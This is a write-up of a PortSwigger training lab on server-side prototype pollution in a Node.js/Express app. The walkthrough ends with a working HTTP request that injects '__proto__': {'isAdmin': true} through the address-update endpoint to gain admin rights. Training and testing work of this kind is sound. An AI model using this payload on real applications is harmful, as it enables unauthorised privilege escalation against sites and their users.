
# Privilege escalation via server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.

To solve the lab:

- Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.

- Identify a gadget property that you can use to escalate your privileges.

- Access the admin panel and delete the user carlos.

You can log in to your own account with the following credentials: wiener:peter

Note: When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

---------------------------------------------

References: 

- https://portswigger.net/web-security/prototype-pollution/server-side





![img](images/Privilege%20escalation%20via%20server-side%20prototype%20pollution/1.png)
![img](images/Privilege%20escalation%20via%20server-side%20prototype%20pollution/2.png)

---------------------------------------------

The login credentials are sent inside a JSON object but the value is not reflected:




It is possible to add data in the “update address” functionality:




It gets reflected:




In this page there is a Javascript script imported:





File “/resources/js/updateAddress.js”:





It is possible to update the “isAdmin” value even though it is not reflected in the page (we see in the code it gets filtered):

```
POST /my-account/change-address HTTP/2
...

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"e6Z5ouDA9AodwILfR7nGgH2nYPtPLzyE","__proto__":{        "isAdmin":true    }}
```




